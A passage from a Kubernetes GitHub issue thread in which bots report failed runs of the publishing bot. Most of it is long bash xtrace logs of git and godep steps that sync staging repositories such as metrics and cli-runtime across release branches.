master.'\n>    \t+ git checkout -q master\n>    \t+ '[' -f kubernetes-sha ']'\n>    \t+ apply-recursive-delete-pattern 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ '[' -z 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>    \t+ local split_recursive_delete_pattern\n>    \t+ read -r -a split_recursive_delete_pattern\n>    \t+ git rm -q --ignore-unmatch -r BUILD '*/BUILD' BUILD.bazel '*/BUILD.bazel' Gopkg.toml\n>    \t+ git add -u\n>    \t+ git-index-clean\n>    \t+ git diff --cached --exit-code\n>    \t+ return 0\n>    \t++ git rev-parse HEAD\n>    \t+ local dst_old_head=de4bd7443b4279fce102063a767746a2b6be4f66\n>    \t+ local k_pending_merge_commit=\n>    \t+ local dst_needs_godeps_update=false\n>    \t++ git rev-parse HEAD\n>    \t+ local dst_merge_point_commit=de4bd7443b4279fce102063a767746a2b6be4f66\n>    \t+ for f_mainline_commit in '${f_mainline_commits}' FLUSH_PENDING_MERGE_COMMIT\n>    \t+ local k_mainline_commit=\n>    \t+ local k_new_pending_merge_commit=\n>    \t+ '[' FLUSH_PENDING_MERGE_COMMIT = FLUSH_PENDING_MERGE_COMMIT ']'\n>    \t+ k_new_pending_merge_commit=FLUSH_PENDING_MERGE_COMMIT\n>    \t+ '[' -n '' ']'\n>    \t+ k_pending_merge_commit=FLUSH_PENDING_MERGE_COMMIT\n>    \t+ '[' FLUSH_PENDING_MERGE_COMMIT = FLUSH_PENDING_MERGE_COMMIT ']'\n>    \t+ break\n>    \t+ echo 'Fixing up godeps after a complete sync'\n>    \t++ git rev-parse HEAD\n>    \t+ '[' de4bd7443b4279fce102063a767746a2b6be4f66 '!=' de4bd7443b4279fce102063a767746a2b6be4f66 ']'\n>    \t+ '[' false = true ']'\n>    \t+ fix-godeps api:master,apimachinery:master,client-go:master '' k8s.io true true false Kubernetes-commit 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ '[' '' = true ']'\n>    \t+ local deps=api:master,apimachinery:master,client-go:master\n>    \t+ local required_packages=\n>    \t+ local base_package=k8s.io\n>    \t+ local is_library=true\n>    \t+ local needs_godeps_update=true\n>    \t+ local squash=false\n>    \t+ local commit_msg_tag=Kubernetes-commit\n>    \t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t++ git rev-parse HEAD\n>    \t+ local dst_old_commit=de4bd7443b4279fce102063a767746a2b6be4f66\n>    \t+ '[' true = true ']'\n>    \t+ update_full_godeps api:master,apimachinery:master,client-go:master k8s.io true Kubernetes-commit\n>    \t+ local deps=api:master,apimachinery:master,client-go:master\n>    \t+ local base_package=k8s.io\n>    \t+ local is_library=true\n>    \t+ local commit_msg_tag=Kubernetes-commit\n>    \t+ ensure-clean-working-dir\n>    \t+ git diff HEAD --exit-code\n>    \t+ for d in '$../*'\n>    \t+ '[' '!' -d '$../*' ']'\n>    \t+ continue\n>    \t+ '[' '!' -f Godeps/Godeps.json ']'\n>    \t+ echo 'Removing k8s.io/* dependencies from Godeps.json'\n>    \t+ local dep=\n>    \t+ local branch=\n>    \t+ local depbranch=\n>    \t++ basename /go-workspace/src/k8s.io/cli-runtime\n>    \t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>    \t+ IFS=:\n>    \t+ read dep branch\n>    \t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/api/\") or . == \"k8s.io/api\") | not))' Godeps/Godeps.json\n>    \t+ indent-godeps\n>    \t+ unexpand --first-only --tabs=2\n>    \t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>    \t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>    \t+ IFS=:\n>    \t+ read dep branch\n>    \t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/apimachinery/\") or . == \"k8s.io/apimachinery\") | not))' Godeps/Godeps.json\n>    \t+ indent-godeps\n>    \t+ unexpand --first-only --tabs=2\n>    \t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>    \t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>    \t+ IFS=:\n>    \t+ read dep branch\n>    \t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/client-go/\") or . == \"k8s.io/client-go\") | not))' Godeps/Godeps.json\n>    \t+ indent-godeps\n>    \t+ unexpand --first-only --tabs=2\n>    \t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>    \t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>    \t+ IFS=:\n>    \t+ read dep branch\n>    \t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/cli-runtime/\") or . == \"k8s.io/cli-runtime\") | not))' Godeps/Godeps.json\n>    \t+ indent-godeps\n>    \t+ unexpand --first-only --tabs=2\n>    \t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>    \t+ echo 'Running godep restore.'\n>    \t+ godep restore\n>    \tgodep: error downloading dep (golang.org/x/sys/unix): unrecognized import path \"golang.org/x/sys/unix\"\n>    \tgodep: Error downloading some deps. Aborting restore and check.\n>\n>[28 Sep 18 11:55 UTC]: exit status 1```\n>\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes/test-infra](https://github.com/kubernetes/test-infra/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "k8s-ci-robot", "body": "@k8s-publishing-bot: Reopening this issue.\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/56876#issuecomment-426509038):\n\n>/reopen\n>\n>The last publishing run failed: exit status 255\n>```\n>...\n>\t+ IS_LIBRARY=true\n>\t+ RECURSIVE_DELETE_PATTERN='BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ SKIP_TAGS=\n>\t+ LAST_PUBLISHED_UPSTREAM_HASH=384ed3708e44d5ea7d06338c7e42341783b6d533\n>\t+ readonly REPO SRC_BRANCH DST_BRANCH DEPS REQUIRED SOURCE_REMOTE SOURCE_REPO_ORG SUBDIR SOURCE_REPO_NAME BASE_PACKAGE IS_LIBRARY RECURSIVE_DELETE_PATTERN SKIP_TAGS LAST_PUBLISHED_UPSTREAM_HASH\n>\t++ dirname /publish_scripts/construct.sh\n>\t+ SCRIPT_DIR=/publish_scripts\n>\t+ source /publish_scripts/util.sh\n>\t++ set -o errexit\n>\t++ set -o nounset\n>\t++ set -o pipefail\n>\t++ set -o xtrace\n>\t+ echo 'Running garbage collection.'\n>\t+ git gc --auto\n>\tRunning garbage collection.\n>\tFetching from origin.\n>\t+ echo 'Fetching from origin.'\n>\t+ git fetch origin --no-tags --prune\n>\tCleaning up checkout.\n>\t+ echo 'Cleaning up checkout.'\n>\t+ git rebase --abort\n>\tNo rebase in progress?\n>\t+ true\n>\t+ git reset -q --hard\n>\t+ git clean -q -f -f -d\n>\t++ git rev-parse HEAD\n>\t+ git checkout -q 5fe3b1a799c749ad543f7affb7a60a5b07091e30\n>\t+ git branch -D release-1.10\n>\t+ git remote set-head origin -d\n>\t+ git rev-parse origin/release-1.10\n>\tSwitching to origin/release-1.10.\n>\t+ echo 'Switching to origin/release-1.10.'\n>\t+ git branch -f release-1.10 origin/release-1.10\n>\t+ git checkout -q release-1.10\n>\tFetching upstream changes.\n>\t+ echo 'Fetching upstream changes.'\n>\t+ git remote\n>\t+ grep -w -q upstream\n>\t+ git remote set-url upstream /go-workspace/src/k8s.io/kubernetes/.git\n>\t+ git fetch -q upstream --no-tags --prune\n>\t++ git rev-parse upstream/release-1.10\n>\t+ UPSTREAM_HASH=384ed3708e44d5ea7d06338c7e42341783b6d533\n>\t+ '[' 384ed3708e44d5ea7d06338c7e42341783b6d533 '!=' 384ed3708e44d5ea7d06338c7e42341783b6d533 ']'\n>\t+ echo 'Skipping sync because upstream/release-1.10 at 384ed3708e44d5ea7d06338c7e42341783b6d533 did not change since last sync.'\n>\tSkipping sync because upstream/release-1.10 at 384ed3708e44d5ea7d06338c7e42341783b6d533 did not change since last sync.\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ LAST_BRANCH=release-1.10\n>\t++ git rev-parse HEAD\n>\t+ LAST_HEAD=b11cf31b380ba10a99b7c0b900f6a71f1045db45\n>\t+ EXTRA_ARGS=()\n>\t+ PUSH_SCRIPT=../push-tags-metrics-release-1.10.sh\n>\t+ echo '#!/bin/bash'\n>\t+ chmod +x ../push-tags-metrics-release-1.10.sh\n>\t+ '[' -z '' ']'\n>\t++ echo kubernetes\n>\t++ echo kubernetes\n>\t++ sed 's/^./\\L\\u&/'\n>\t+ /sync-tags --prefix kubernetes- --commit-message-tag Kubernetes-commit --source-remote upstream --source-branch release-1.10 --push-script ../push-tags-metrics-release-1.10.sh --dependencies apimachinery:release-1.10,api:release-1.10,client-go:release-7.0 --mapping-output-file '../tag-metrics-{{.Tag}}-mapping' -alsologtostderr ''\n>\tRemoving all local copies of origin and upstream tags.\n>\tFetching tags from remote \"upstream\".\n>\tFetching tags from remote \"origin\".\n>\t++ git rev-parse release-1.10\n>\t+ '[' b11cf31b380ba10a99b7c0b900f6a71f1045db45 '!=' b11cf31b380ba10a99b7c0b900f6a71f1045db45 ']'\n>\t+ git checkout release-1.10\n>\tAlready on 'release-1.10'\n>\tYour branch is up-to-date with 'origin/release-1.10'.\n>[03 Oct 18 04:34 UTC]: Successfully constructed release-1.10\n>[03 Oct 18 04:34 UTC]: /publish_scripts/construct.sh metrics release-1.11 release-1.11 apimachinery:release-1.11,api:release-1.11,client-go:release-8.0  /go-workspace/src/k8s.io/kubernetes/.git staging/src/k8s.io/metrics kubernetes kubernetes k8s.io true \"BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml\"  40327b32306e9a03fc33670f69e5719494ace882\n>\t+ '[' '!' 14 -eq 14 ']'\n>\t+ REPO=metrics\n>\t+ SRC_BRANCH=release-1.11\n>\t+ DST_BRANCH=release-1.11\n>\t+ DEPS=apimachinery:release-1.11,api:release-1.11,client-go:release-8.0\n>\t+ REQUIRED=\n>\t+ SOURCE_REMOTE=/go-workspace/src/k8s.io/kubernetes/.git\n>\t+ SUBDIR=staging/src/k8s.io/metrics\n>\t+ SOURCE_REPO_ORG=kubernetes\n>\t+ SOURCE_REPO_NAME=kubernetes\n>\t+ shift 9\n>\t+ BASE_PACKAGE=k8s.io\n>\t+ IS_LIBRARY=true\n>\t+ RECURSIVE_DELETE_PATTERN='BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ SKIP_TAGS=\n>\t+ LAST_PUBLISHED_UPSTREAM_HASH=40327b32306e9a03fc33670f69e5719494ace882\n>\t+ readonly REPO SRC_BRANCH DST_BRANCH DEPS REQUIRED SOURCE_REMOTE SOURCE_REPO_ORG SUBDIR SOURCE_REPO_NAME BASE_PACKAGE IS_LIBRARY RECURSIVE_DELETE_PATTERN SKIP_TAGS LAST_PUBLISHED_UPSTREAM_HASH\n>\t++ dirname /publish_scripts/construct.sh\n>\t+ SCRIPT_DIR=/publish_scripts\n>\t+ source /publish_scripts/util.sh\n>\t++ set -o errexit\n>\t++ set -o nounset\n>\t++ set -o pipefail\n>\t++ set -o xtrace\n>\tRunning garbage collection.\n>\t+ echo 'Running garbage collection.'\n>\t+ git gc --auto\n>\tFetching from origin.\n>\t+ echo 'Fetching from origin.'\n>\t+ git fetch origin --no-tags --prune\n>\t+ echo 'Cleaning up checkout.'\n>\t+ git rebase --abort\n>\tCleaning up checkout.\n>\tNo rebase in progress?\n>\t+ true\n>\t+ git reset -q --hard\n>\t+ git clean -q -f -f -d\n>\t++ git rev-parse HEAD\n>\t+ git checkout -q b11cf31b380ba10a99b7c0b900f6a71f1045db45\n>\t+ git branch -D release-1.11\n>\t+ git remote set-head origin -d\n>\t+ git rev-parse origin/release-1.11\n>\t+ echo 'Switching to origin/release-1.11.'\n>\tSwitching to origin/release-1.11.\n>\t+ git branch -f release-1.11 origin/release-1.11\n>\t+ git checkout -q release-1.11\n>\tFetching upstream changes.\n>\t+ echo 'Fetching upstream changes.'\n>\t+ git remote\n>\t+ grep -w -q upstream\n>\t+ git remote set-url upstream /go-workspace/src/k8s.io/kubernetes/.git\n>\t+ git fetch -q upstream --no-tags --prune\n>\t++ git rev-parse upstream/release-1.11\n>\t+ UPSTREAM_HASH=40327b32306e9a03fc33670f69e5719494ace882\n>\t+ '[' 40327b32306e9a03fc33670f69e5719494ace882 '!=' 40327b32306e9a03fc33670f69e5719494ace882 ']'\n>\t+ echo 'Skipping sync because upstream/release-1.11 at 40327b32306e9a03fc33670f69e5719494ace882 did not change since last sync.'\n>\tSkipping sync because upstream/release-1.11 at 40327b32306e9a03fc33670f69e5719494ace882 did not change since last sync.\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ LAST_BRANCH=release-1.11\n>\t++ git rev-parse HEAD\n>\t+ LAST_HEAD=972ef826b8401c180b89cefc7457daa2d116daa9\n>\t+ EXTRA_ARGS=()\n>\t+ PUSH_SCRIPT=../push-tags-metrics-release-1.11.sh\n>\t+ echo '#!/bin/bash'\n>\t+ chmod +x ../push-tags-metrics-release-1.11.sh\n>\t+ '[' -z '' ']'\n>\t++ echo kubernetes\n>\t++ echo kubernetes\n>\t++ sed 's/^./\\L\\u&/'\n>\t+ /sync-tags --prefix kubernetes- --commit-message-tag Kubernetes-commit --source-remote upstream --source-branch release-1.11 --push-script ../push-tags-metrics-release-1.11.sh --dependencies apimachinery:release-1.11,api:release-1.11,client-go:release-8.0 --mapping-output-file '../tag-metrics-{{.Tag}}-mapping' -alsologtostderr ''\n>\tRemoving all local copies of origin and upstream tags.\n>\tFetching tags from remote \"upstream\".\n>\tFetching tags from remote \"origin\".\n>\t++ git rev-parse release-1.11\n>\t+ '[' 972ef826b8401c180b89cefc7457daa2d116daa9 '!=' 972ef826b8401c180b89cefc7457daa2d116daa9 ']'\n>\t+ git checkout release-1.11\n>\tAlready on 'release-1.11'\n>\tYour branch is up-to-date with 'origin/release-1.11'.\n>[03 Oct 18 04:34 UTC]: Successfully constructed release-1.11\n>[03 Oct 18 04:34 UTC]: /publish_scripts/construct.sh metrics release-1.12 release-1.12 apimachinery:release-1.12,api:release-1.12,client-go:release-9.0  /go-workspace/src/k8s.io/kubernetes/.git staging/src/k8s.io/metrics kubernetes kubernetes k8s.io true \"BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml\"  ecbc4a3aec3b7bedbdb2842adb4b69c25d3fcc07\n>\t+ '[' '!' 14 -eq 14 ']'\n>\t+ REPO=metrics\n>\t+ SRC_BRANCH=release-1.12\n>\t+ DST_BRANCH=release-1.12\n>\t+ DEPS=apimachinery:release-1.12,api:release-1.12,client-go:release-9.0\n>\t+ REQUIRED=\n>\t+ SOURCE_REMOTE=/go-workspace/src/k8s.io/kubernetes/.git\n>\t+ SUBDIR=staging/src/k8s.io/metrics\n>\t+ SOURCE_REPO_ORG=kubernetes\n>\t+ SOURCE_REPO_NAME=kubernetes\n>\t+ shift 9\n>\t+ BASE_PACKAGE=k8s.io\n>\t+ IS_LIBRARY=true\n>\t+ RECURSIVE_DELETE_PATTERN='BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ SKIP_TAGS=\n>\t+ LAST_PUBLISHED_UPSTREAM_HASH=ecbc4a3aec3b7bedbdb2842adb4b69c25d3fcc07\n>\t+ readonly REPO SRC_BRANCH DST_BRANCH DEPS REQUIRED SOURCE_REMOTE SOURCE_REPO_ORG SUBDIR SOURCE_REPO_NAME BASE_PACKAGE IS_LIBRARY RECURSIVE_DELETE_PATTERN SKIP_TAGS LAST_PUBLISHED_UPSTREAM_HASH\n>\t++ dirname /publish_scripts/construct.sh\n>\t+ SCRIPT_DIR=/publish_scripts\n>\t+ source /publish_scripts/util.sh\n>\t++ set -o errexit\n>\t++ set -o nounset\n>\t++ set -o pipefail\n>\t++ set -o xtrace\n>\tRunning garbage collection.\n>\t+ echo 'Running garbage collection.'\n>\t+ git gc --auto\n>\tFetching from origin.\n>\t+ echo 'Fetching from origin.'\n>\t+ git fetch origin --no-tags --prune\n>\tCleaning up checkout.\n>\t+ echo 'Cleaning up checkout.'\n>\t+ git rebase --abort\n>\tNo rebase in progress?\n>\t+ true\n>\t+ git reset -q --hard\n>\t+ git clean -q -f -f -d\n>\t++ git rev-parse HEAD\n>\t+ git checkout -q 972ef826b8401c180b89cefc7457daa2d116daa9\n>\t+ git branch -D release-1.12\n>\t+ git remote set-head origin -d\n>\t+ git rev-parse origin/release-1.12\n>\t+ echo 'Switching to origin/release-1.12.'\n>\t+ git branch -f release-1.12 origin/release-1.12\n>\tSwitching to origin/release-1.12.\n>\t+ git checkout -q release-1.12\n>\t+ echo 'Fetching upstream changes.'\n>\tFetching upstream changes.\n>\t+ git remote\n>\t+ grep -w -q upstream\n>\t+ git remote set-url upstream /go-workspace/src/k8s.io/kubernetes/.git\n>\t+ git fetch -q upstream --no-tags --prune\n>\t++ git rev-parse upstream/release-1.12\n>\t+ UPSTREAM_HASH=8b509978142b7715242c8b0cc66c4f87cc58d586\n>\t+ '[' 8b509978142b7715242c8b0cc66c4f87cc58d586 '!=' ecbc4a3aec3b7bedbdb2842adb4b69c25d3fcc07 ']'\n>\t+ echo 'Upstream branch upstream/release-1.12 moved from '\\''ecbc4a3aec3b7bedbdb2842adb4b69c25d3fcc07'\\'' to '\\''8b509978142b7715242c8b0cc66c4f87cc58d586'\\''. We have to sync.'\n>\tUpstream branch upstream/release-1.12 moved from 'ecbc4a3aec3b7bedbdb2842adb4b69c25d3fcc07' to '8b509978142b7715242c8b0cc66c4f87cc58d586'. We have to sync.\n>\t+ sync_repo kubernetes kubernetes staging/src/k8s.io/metrics release-1.12 release-1.12 apimachinery:release-1.12,api:release-1.12,client-go:release-9.0 '' k8s.io true 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local source_repo_org=kubernetes\n>\t+ local source_repo_name=kubernetes\n>\t+ local subdirectory=staging/src/k8s.io/metrics\n>\t+ local src_branch=release-1.12\n>\t+ local dst_branch=release-1.12\n>\t+ local deps=apimachinery:release-1.12,api:release-1.12,client-go:release-9.0\n>\t+ local required_packages=\n>\t+ local base_package=k8s.io\n>\t+ local is_library=true\n>\t+ shift 9\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ readonly subdirectory src_branch dst_branch deps is_library\n>\t+ local new_branch=false\n>\t+ local orphan=false\n>\t+ git rev-parse -q --verify HEAD\n>\tc6bb70553a8287cd6451211dd366fee12e088b95\n>\t++ ls -1\n>\t++ wc -l\n>\t+ '[' 10 = 0 ']'\n>\t++ git rev-parse HEAD\n>\tStarting at existing release-1.12 commit c6bb70553a8287cd6451211dd366fee12e088b95.\n>\t+ echo 'Starting at existing release-1.12 commit c6bb70553a8287cd6451211dd366fee12e088b95.'\n>\t+ git branch -D filtered-branch\n>\t+ git branch -f upstream-branch upstream/release-1.12\n>\tBranch upstream-branch set up to track remote branch release-1.12 from upstream.\n>\t++ git rev-parse upstream-branch\n>\tChecked out source commit 8b509978142b7715242c8b0cc66c4f87cc58d586.\n>\t+ echo 'Checked out source commit 8b509978142b7715242c8b0cc66c4f87cc58d586.'\n>\t+ git checkout -q upstream-branch -b filtered-branch\n>\t+ git reset -q --hard upstream-branch\n>\t+ local f_mainline_commits=\n>\t+ '[' false = true ']'\n>\t+ '[' false = true ']'\n>\t++ last-kube-commit Kubernetes-commit release-1.12\n>\t++ local commit_msg_tag=Kubernetes-commit\n>\t++ git log --format=%B release-1.12\n>\t++ grep '^Kubernetes-commit: '\n>\t++ head -n 1\n>\t++ sed 's/^Kubernetes-commit: //g'\n>\t++ true\n>\t+ local k_base_commit=4e599c848401470c3c10eb52252c5e3bb5463d3b\n>\t+ '[' -z 4e599c848401470c3c10eb52252c5e3bb5463d3b ']'\n>\t++ git-find-merge 4e599c848401470c3c10eb52252c5e3bb5463d3b upstream/release-1.12\n>\t++ tail -1\n>\t+++ git rev-list '4e599c848401470c3c10eb52252c5e3bb5463d3b^1..upstream/release-1.12' --first-parent\n>\t++ awk 'NR==FNR{a[$1]++;next} a[$1] ' /dev/fd/63 /dev/fd/62\n>\t+++ git rev-list 4e599c848401470c3c10eb52252c5e3bb5463d3b..upstream/release-1.12 --ancestry-path\n>\t+++ git rev-parse 4e599c848401470c3c10eb52252c5e3bb5463d3b\n>\t+ local k_base_merge=4e599c848401470c3c10eb52252c5e3bb5463d3b\n>\t+ '[' -z 4e599c848401470c3c10eb52252c5e3bb5463d3b ']'\n>\t+ git branch -f filtered-branch-base 4e599c848401470c3c10eb52252c5e3bb5463d3b\n>\tRewriting upstream branch release-1.12 to only include commits for staging/src/k8s.io/metrics.\n>\t+ echo 'Rewriting upstream branch release-1.12 to only include commits for staging/src/k8s.io/metrics.'\n>\t+ filter-branch Kubernetes-commit staging/src/k8s.io/metrics 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' filtered-branch filtered-branch-base\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ local subdirectory=staging/src/k8s.io/metrics\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ echo 'Running git filter-branch ...'\n>\t+ local index_filter=\n>\t+ '[' -n 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>\t+ patterns=()\n>\t+ local patterns\n>\t+ local p=\n>\t+ index_filter='git rm -q --cached --ignore-unmatch -r'\n>\t+ IFS=' '\n>\t+ read -ra patterns\n>\tRunning git filter-branch ...\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''BUILD'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''*/BUILD'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''BUILD.bazel'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''*/BUILD.bazel'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''Gopkg.toml'\\'''\n>\t+ git filter-branch -f --index-filter 'git rm -q --cached --ignore-unmatch -r '\\''BUILD'\\'' '\\''*/BUILD'\\'' '\\''BUILD.bazel'\\'' '\\''*/BUILD.bazel'\\'' '\\''Gopkg.toml'\\''' --msg-filter 'awk 1 && echo && echo \"Kubernetes-commit: ${GIT_COMMIT}\"' --subdirectory-filter staging/src/k8s.io/metrics -- filtered-branch filtered-branch-base\n>\t++ git rev-parse filtered-branch-base\n>\t+ local f_base_commit=7329a008012f4a662ca1aea5d27c85fc37fe1d8e\n>\t++ git log --first-parent --format=%H --reverse 7329a008012f4a662ca1aea5d27c85fc37fe1d8e..HEAD\n>\t+ f_mainline_commits=\n>\t+ echo 'Checking out branch release-1.12.'\n>\t+ git checkout -q release-1.12\n>\tChecking out branch release-1.12.\n>\t+ '[' -f kubernetes-sha ']'\n>\t+ apply-recursive-delete-pattern 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' -z 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>\t+ local split_recursive_delete_pattern\n>\t+ read -r -a split_recursive_delete_pattern\n>\t+ git rm -q --ignore-unmatch -r BUILD '*/BUILD' BUILD.bazel '*/BUILD.bazel' Gopkg.toml\n>\t+ git add -u\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\t+ return 0\n>\t++ git rev-parse HEAD\n>\t+ local dst_old_head=c6bb70553a8287cd6451211dd366fee12e088b95\n>\t+ local k_pending_merge_commit=\n>\t+ local dst_needs_godeps_update=false\n>\t++ git rev-parse HEAD\n>\t+ local dst_merge_point_commit=c6bb70553a8287cd6451211dd366fee12e088b95\n>\t+ for f_mainline_commit in '${f_mainline_commits}' FLUSH_PENDING_MERGE_COMMIT\n>\t+ local k_mainline_commit=\n>\t+ local k_new_pending_merge_commit=\n>\t+ '[' FLUSH_PENDING_MERGE_COMMIT = FLUSH_PENDING_MERGE_COMMIT ']'\n>\t+ k_new_pending_merge_commit=FLUSH_PENDING_MERGE_COMMIT\n>\t+ '[' -n '' ']'\n>\t+ k_pending_merge_commit=FLUSH_PENDING_MERGE_COMMIT\n>\t+ '[' FLUSH_PENDING_MERGE_COMMIT = FLUSH_PENDING_MERGE_COMMIT ']'\n>\t+ break\n>\t+ echo 'Fixing up godeps after a complete sync'\n>\tFixing up godeps after a complete sync\n>\t++ git rev-parse HEAD\n>\t+ '[' c6bb70553a8287cd6451211dd366fee12e088b95 '!=' c6bb70553a8287cd6451211dd366fee12e088b95 ']'\n>\t+ '[' false = true ']'\n>\t+ fix-godeps apimachinery:release-1.12,api:release-1.12,client-go:release-9.0 '' k8s.io true true false Kubernetes-commit 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' '' = true ']'\n>\t+ local deps=apimachinery:release-1.12,api:release-1.12,client-go:release-9.0\n>\t+ local required_packages=\n>\t+ local base_package=k8s.io\n>\t+ local is_library=true\n>\t+ local needs_godeps_update=true\n>\t+ local squash=false\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t++ git rev-parse HEAD\n>\t+ local dst_old_commit=c6bb70553a8287cd6451211dd366fee12e088b95\n>\t+ '[' true = true ']'\n>\t+ update_full_godeps apimachinery:release-1.12,api:release-1.12,client-go:release-9.0 k8s.io true Kubernetes-commit\n>\t+ local deps=apimachinery:release-1.12,api:release-1.12,client-go:release-9.0\n>\t+ local base_package=k8s.io\n>\t+ local is_library=true\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\t+ for d in '$../*'\n>\t+ '[' '!' -d '$../*' ']'\n>\t+ continue\n>\t+ '[' '!' -f Godeps/Godeps.json ']'\n>\t+ echo 'Removing k8s.io/* dependencies from Godeps.json'\n>\t+ local dep=\n>\t+ local branch=\n>\t+ local depbranch=\n>\tRemoving k8s.io/* dependencies from Godeps.json\n>\t++ basename /go-workspace/src/k8s.io/metrics\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/apimachinery/\") or . == \"k8s.io/apimachinery\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/api/\") or . == \"k8s.io/api\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/client-go/\") or . == \"k8s.io/client-go\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/metrics/\") or . == \"k8s.io/metrics\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\tRunning godep restore.\n>\t+ echo 'Running godep restore.'\n>\t+ godep restore\n>\t+ checkout-deps-to-kube-commit Kubernetes-commit apimachinery:release-1.12,api:release-1.12,client-go:release-9.0\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ deps=()\n>\t+ local deps\n>\t+ IFS=,\n>\t+ read -a deps\n>\t++ last-kube-commit Kubernetes-commit HEAD\n>\t++ local commit_msg_tag=Kubernetes-commit\n>\t++ git log --format=%B HEAD\n>\t++ grep '^Kubernetes-commit: '\n>\t++ head -n 1\n>\t++ sed 's/^Kubernetes-commit: //g'\n>\t+ local k_last_kube_commit=4e599c848401470c3c10eb52252c5e3bb5463d3b\n>\t+ '[' -z 4e599c848401470c3c10eb52252c5e3bb5463d3b ']'\n>\t++ git-find-merge 4e599c848401470c3c10eb52252c5e3bb5463d3b upstream-branch\n>\t++ tail -1\n>\t++ awk 'NR==FNR{a[$1]++;next} a[$1] ' /dev/fd/63 /dev/fd/62\n>\t+++ git rev-list '4e599c848401470c3c10eb52252c5e3bb5463d3b^1..upstream-branch' --first-parent\n>\t+++ git rev-list 4e599c848401470c3c10eb52252c5e3bb5463d3b..upstream-branch --ancestry-path\n>\t+++ git rev-parse 4e599c848401470c3c10eb52252c5e3bb5463d3b\n>\t+ local 